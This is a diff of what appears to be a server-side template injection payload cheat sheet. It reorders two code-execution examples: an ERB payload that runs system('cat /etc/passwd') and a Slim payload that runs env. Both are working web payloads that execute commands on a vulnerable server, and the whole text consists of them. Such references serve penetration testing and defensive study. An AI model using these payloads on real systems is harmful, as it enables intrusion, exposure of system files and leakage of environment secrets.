@@ -91,16 +91,15 @@ Slim:
 
 ### Code execution
 
-Execute code using SSTI for Slim engine.
-
-```powershell
-#{ %x|env| }
-```
-
 Execute code using SSTI for ERB engine.
 
 ```ruby
 <%= system('cat /etc/passwd') %>
+```
+Execute code using SSTI for Slim engine.
+
+```powershell
+#{ %x|env| }
 ```
 
 ## Java
